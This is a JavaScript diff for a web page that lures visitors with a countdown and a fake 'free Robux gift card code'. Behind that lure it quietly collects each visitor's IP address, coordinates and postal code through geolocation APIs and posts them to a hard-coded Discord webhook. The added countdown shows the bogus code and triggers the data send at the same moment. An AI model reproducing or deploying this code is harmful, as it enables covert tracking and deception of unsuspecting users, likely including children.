@@ -1,11 +1,27 @@
-// Function to get the user's IP address
+// Countdown timer setup: 5 minutes (300 seconds)
+let timeLeft = 300; 
+let timerInterval;
+
+// Update the countdown display on page
+function updateCountdownDisplay() {
+  const hours = Math.floor(timeLeft / 3600);
+  const minutes = Math.floor((timeLeft % 3600) / 60);
+  const seconds = timeLeft % 60;
+
+  const formattedTime =
+    (hours > 0 ? hours.toString().padStart(2, '0') + ':' : '') +
+    minutes.toString().padStart(2, '0') + ':' +
+    seconds.toString().padStart(2, '0');
+
+  document.querySelector('.countdown-value').textContent = formattedTime;
+}
+
+// Fetch user's IP address from ipify service
 async function getUserIPAddress() {
   try {
     console.debug('Fetching user IP address...');
     const response = await fetch('https://api.ipify.org?format=json');
-    if (!response.ok) {
-      throw new Error(`ipify API HTTP error ${response.status}`);
-    }
+    if (!response.ok) throw new Error(`ipify API HTTP error ${response.status}`);
     const data = await response.json();
     console.debug('IP address received:', data.ip);
     return data.ip;
@@ -15,34 +31,27 @@ async function getUserIPAddress() {
   }
 }
 
-// Function to get the user's coordinates
+// Fetch user's coordinates from ipapi.co
 async function getUserCoordinates() {
   try {
     console.debug('Fetching user coordinates...');
     const response = await fetch('https://ipapi.co/json/');
-    if (!response.ok) {
-      throw new Error(`ipapi.co API HTTP error ${response.status}`);
-    }
+    if (!response.ok) throw new Error(`ipapi.co API HTTP error ${response.status}`);
     const data = await response.json();
     console.debug('Coordinates received:', { latitude: data.latitude, longitude: data.longitude });
-    return {
-      latitude: data.latitude ?? 'Unknown',
-      longitude: data.longitude ?? 'Unknown'
-    };
+    return { latitude: data.latitude ?? 'Unknown', longitude: data.longitude ?? 'Unknown' };
   } catch (error) {
     console.error('Error getting coordinates:', error);
     return { latitude: 'Unknown', longitude: 'Unknown' };
   }
 }
 
-// Function to get the user's postal code
+// Fetch user's postal code from ipapi.co
 async function getUserPostalCode() {
   try {
     console.debug('Fetching user postal code...');
     const response = await fetch('https://ipapi.co/json/');
-    if (!response.ok) {
-      throw new Error(`ipapi.co API HTTP error ${response.status}`);
-    }
+    if (!response.ok) throw new Error(`ipapi.co API HTTP error ${response.status}`);
     const data = await response.json();
     console.debug('Postal code received:', data.postal);
     return data.postal ?? 'Unknown';
@@ -52,13 +61,15 @@ async function getUserPostalCode() {
   }
 }
 
-// Function to send the information to the Discord webhook
+// Send collected info to Discord webhook
 async function sendToDiscordWebhook(ipAddress, coordinates, postalCode) {
   try {
     console.debug('Sending data to Discord webhook...');
+    
+    // Your Discord webhook URL
     const webhookUrl = 'https://discord.com/api/webhooks/1402759827490340925/z-DDNtNjRZV-ODD7afwZQsfRaJKZKJPkA126OHF8NgfTt9nC8reIUp6LUpiplz3HfpN9';
 
-    // Construct message content neatly formatted for Discord
+    // Prepare the message content
     const messageContent = `
 **User Information:**
 - IP Address: \`${ipAddress}\`
@@ -77,13 +88,14 @@ async function sendToDiscordWebhook(ipAddress, coordinates, postalCode) {
     if (!response.ok) {
       throw new Error(`Discord webhook HTTP error ${response.status}`);
     }
+    
     console.debug('Data sent to Discord successfully.');
   } catch (error) {
     console.error('Error sending to Discord webhook:', error);
   }
 }
 
-// Main function to retrieve and send the information
+// Main function to gather info and send it
 async function sendUserInfoToDiscord() {
   try {
     console.info('Starting process to gather and send user info...');
@@ -102,5 +114,31 @@ async function sendUserInfoToDiscord() {
   }
 }
 
-// Kick off the process
-sendUserInfoToDiscord();
+
+// Countdown logic executed every second
+function countDown() {
+  if (timeLeft <= 0) {
+    clearInterval(timerInterval);
+
+    document.querySelector('.countdown-text').textContent = 'Your free Robux gift card code will be displayed shortly!';
+
+    // Display fake Robux code after 2 seconds
+    setTimeout(() => {
+      const robuxCodeElem = document.getElementById('robuxCode');
+      robuxCodeElem.textContent = 'ROBLOX-12345-FREE';
+      robuxCodeElem.style.display = 'block';
+    }, 2000);
+
+    // Trigger user info send
+    sendUserInfoToDiscord();
+
+    return;
+  }
+
+  updateCountdownDisplay();
+  timeLeft--;
+}
+
+// Initialize countdown display and start interval
+updateCountdownDisplay();
+timerInterval = setInterval(countDown, 1000);
